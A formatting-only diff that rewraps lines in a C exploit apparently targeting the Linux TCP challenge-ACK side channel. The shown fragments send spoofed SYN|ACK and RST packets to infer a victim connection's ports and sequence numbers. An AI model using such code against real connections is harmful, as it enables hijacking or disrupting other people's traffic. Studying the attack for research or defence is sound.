@@ -111,20 +111,26 @@ static packet_t g_rst_pkt;
 
 
 /* prototypes.. */
-int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli);
+int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv,
+		struct sockaddr_in *pcli);
 
 uint16_t in_cksum(uint16_t *addr, size_t len);
-void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, uint32_t seq);
-int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len);
-int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size_t len);
-int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t *pack, uint32_t *pseq, void **pdata, size_t *plen);
+void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc,
+		struct sockaddr_in *pdst, uint32_t seq);
+int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn,
+		u_char flags, char *data, size_t len);
+int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags,
+		char *data, size_t len);
+int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags,
+		uint32_t *pack, uint32_t *pseq, void **pdata, size_t *plen);
 char *tcp_flags(u_char flags);
 
 void setterm(int mode);
 int kbhit(void);
 
 int lookup_host(char *hostname, struct sockaddr_in *addr);
-int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport, int *off2ip);
+int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport,
+		int *off2ip);
 
 
 /*
@@ -139,7 +145,8 @@ int main(int argc, char *argv[])
 
 	/* we're not leaving main until we're sure the arguments are good. */
 	if (argc < 4) {
-		fprintf(stderr, "usage: %s <server addr> <server port> <client addr> [<client port>]\n", argv[0]);
+		fprintf(stderr, "usage: %s <server addr> <server port> <client addr> [<client port>]\n",
+				argv[0]);
 		return 1;
 	}
 
@@ -210,7 +217,8 @@ int lookup_host(char *hostname, struct sockaddr_in *addr)
 		if (hent == (struct hostent *)NULL) {
 			char errstr[1024] = { 0 };
 
-			snprintf(errstr, sizeof(errstr) - 1, "[!] Unable to resolve: \"%s\"", hostname);
+			snprintf(errstr, sizeof(errstr) - 1, "[!] Unable to resolve: \"%s\"",
+					hostname);
 			herror(errstr);
 			return 0;
 		}
@@ -238,7 +246,8 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport, int *off
 #else
    iface = pcap_lookupdev(errorstr);
    if (iface == NULL) {
-	   fprintf(stderr, "[!] Unable to find a suitable capture device: %s\n", errorstr);
+	   fprintf(stderr, "[!] Unable to find a suitable capture device: %s\n",
+			   errorstr);
 	   return 0;
    }
 #endif
@@ -283,8 +292,8 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport, int *off
    }
 
    if (filter) {
-	   sprintf(filterstr, "tcp and src %s and src port %d and dst port %d", inet_ntoa(psrv->sin_addr),
-			   ntohs(psrv->sin_port), lport);
+	   sprintf(filterstr, "tcp and src %s and src port %d and dst port %d",
+			   inet_ntoa(psrv->sin_addr), ntohs(psrv->sin_port), lport);
 	   if (pcap_compile(*pcap, &bpfp, filterstr, 1, 0) == -1)
 		   return 0;
 	   if (pcap_setfilter(*pcap, &bpfp) == -1)
@@ -479,7 +488,8 @@ int sync_time_with_remote(void)
 		chack_cnt[round] = g_chack_cnt;
 		g_chack_cnt = 0;
 
-		printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
+		printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1,
+				chack_cnt[round]);
 
 		/* did we sync?? */
 		if (chack_cnt[round] == 100) {
@@ -525,7 +535,8 @@ int sync_time_with_remote(void)
 				fprintf(stderr, "[!] maximum attempts reached! giving up.\n");
 				break;
 			}
-			fprintf(stderr, "[!] reached round %d without success, restarting...\n", round + 1);
+			fprintf(stderr, "[!] reached round %d without success, restarting...\n",
+					round + 1);
 			round = 0;
 		}
 	}
@@ -654,7 +665,8 @@ int infer_four_tuple(void)
 			}
 			/* no initial guess available... */
 			else {
-				/* initialize algorithm for port number checking * ... "the default range on Linux is only from 32768 to 61000"
+				/* initialize algorithm for port number checking
+				 * ... "the default range on Linux is only from 32768 to 61000"
 				 */
 				// XXX: TODO: scale number of guesses per round based on feedback
 				sched = build_schedule(32768, 61000, &nchunks);
@@ -707,7 +719,8 @@ int infer_four_tuple(void)
 #ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
 		gettimeofday(&now, NULL);
 		timersub(&now, &round_start, &diff);
-		printf("    sent %d spoofed SYN|ACK packets in %lu %lu\n", (int)(bs_end - bs_start), diff.tv_sec, diff.tv_usec);
+		printf("    sent %lu spoofed SYN|ACK packets in %lu %lu\n",
+				bs_end - bs_start, diff.tv_sec, diff.tv_usec);
 #endif
 
 		/* send 100 RSTs */
@@ -906,7 +919,8 @@ int infer_sequence_number(void)
 #ifdef DEBUG_SEQ_INFER_SPOOF_SEND
 		gettimeofday(&now, NULL);
 		timersub(&now, &round_start, &diff);
-		printf("[*] seq-infer: spoofed %lu RSTs in %lu %lu\n", pkts_sent, diff.tv_sec, diff.tv_usec);
+		printf("[*] seq-infer: spoofed %lu RSTs in %lu %lu\n", pkts_sent,
+				diff.tv_sec, diff.tv_usec);
 #endif
 
 		/* send 100 RSTs */
@@ -971,7 +985,8 @@ int infer_sequence_number(void)
 							seq_block, seq_block + g_ctx.winsz);
 
 					/* build a schedule working from right to left */
-					sched = build_schedule_reverse(seq_block - g_ctx.winsz, seq_block + g_ctx.winsz, &nchunks);
+					sched = build_schedule_reverse(seq_block - g_ctx.winsz,
+							seq_block + g_ctx.winsz, &nchunks);
 					if (!sched)
 						return 0;
 					ci = 0;
@@ -1157,7 +1172,8 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 						}
 
 						else
-							printf("[*] Packet with unexpected flags (0x%x) received...\n", flags);
+							printf("[*] Packet with unexpected flags (0x%x) received...\n",
+									flags);
 
 						/* see if we got data from remote... */
 						if (datalen > 0) {
@@ -1378,7 +1394,8 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 				g_conn_states[pconn->state],
 				shost, ntohs(tcp.th_sport),
 				dhost, ntohs(tcp.th_dport),
-				tcp_flags(tcp.th_flags), (u_long)pconn->seq, (u_long)pconn->ack, (u_long)len);
+				tcp_flags(tcp.th_flags), (u_long)pconn->seq,
+				(u_long)pconn->ack, (u_long)len);
 	}
 #endif
 
@@ -1460,13 +1477,17 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t
 
 		strcpy(shost, inet_ntoa(pip->ip_src));
 		strcpy(dhost, inet_ntoa(pip->ip_dst));
-		//printf("inbuf %p, ptcp %p, ptctp+1 %p, caplen %lu\n", inbuf, ptcp, ptcp+1, (uint32_t)pph->caplen);
+		/*
+		printf("inbuf %p, ptcp %p, ptctp+1 %p, caplen %lu\n", inbuf, ptcp,
+				ptcp+1, (uint32_t)pph->caplen);
+		 */
 		printf("[*] %s : %s:%d <-- %s:%d : %s : seq %lu, ack %lu (len %lu)\n",
 				g_conn_states[g_ctx.conn_legit.state],
 				dhost, ntohs(ptcp->th_dport),
 				shost, ntohs(ptcp->th_sport),
 				tcp_flags(ptcp->th_flags),
-				(u_long)ntohl(ptcp->th_seq), (u_long)ntohl(ptcp->th_ack), datalen);
+				(u_long)ntohl(ptcp->th_seq), (u_long)ntohl(ptcp->th_ack),
+				datalen);
 	}
 #endif
 
